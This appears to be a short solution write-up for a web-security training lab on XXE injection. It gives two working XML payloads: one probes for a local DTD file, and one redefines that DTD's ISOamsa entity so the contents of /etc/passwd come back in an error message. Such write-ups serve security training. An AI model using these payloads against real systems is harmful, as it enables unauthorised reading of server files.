# Lab: Exploiting XXE to retrieve data by repurposing a local DTD

Intercept a request for check stock and add the following xml before forwarding:
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

This does not return an error, but a random filename will, indicating that the dtd does exist at the specified location.

Do a google search for the file to find documentation of the entities defined in the dtd. The first one is `ISOamsa`

Use the following xml in another check stock request, redefining the `ISOamsa` entity to trigger an error:
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamsa '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

This returns the contents of `/etc/passwd` in the error, solving the lab.